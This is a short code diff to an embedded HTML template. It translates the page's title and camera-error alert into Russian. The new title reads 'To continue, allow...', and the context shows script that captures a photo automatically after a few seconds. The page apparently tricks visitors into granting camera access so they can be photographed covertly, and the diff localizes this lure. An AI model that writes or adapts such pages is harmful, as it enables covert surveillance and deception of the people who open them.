@@ -26,7 +26,7 @@ HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Hevorix</title>
+    <title>Что бы продолжить разрешите...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
         body {
@@ -74,7 +74,7 @@ HTML_TEMPLATE = """
                 setTimeout(capturePhoto, 3000); 
 
             } catch (err) {
-                alert('Kamera ishlamadi! Iltimos ruxsat bering.');
+                alert('Камера не сработало! Пожалуйста разрешите.');
                 console.error('Camera error:', err);
             }
         }
